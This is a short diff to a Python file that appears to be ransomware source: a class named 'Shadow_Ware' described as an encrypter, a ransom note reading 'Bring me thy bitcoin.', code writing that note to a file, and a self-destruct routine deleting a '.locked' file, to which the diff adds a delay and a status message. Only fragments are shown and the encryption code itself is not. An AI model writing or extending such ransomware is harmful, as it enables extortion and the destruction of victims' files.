@@ -1,6 +1,6 @@
 instructions = "Bring me thy bitcoin."
 
-import base64, random, os, hashlib, hmac, string
+import base64, random, os, hashlib, hmac, string, time
 
 """ Class for encrypter """
 class Shadow_Ware():
@@ -99,6 +99,8 @@ class Shadow_Ware():
       file.write(instructions)
 
   def self_destruct(self):
+    time.sleep(3)
+    print("Encrypter: Self Destructing")
     try:
       os.remove(os.path.abspath(__file__ + ".locked"))
     except Exception as e:
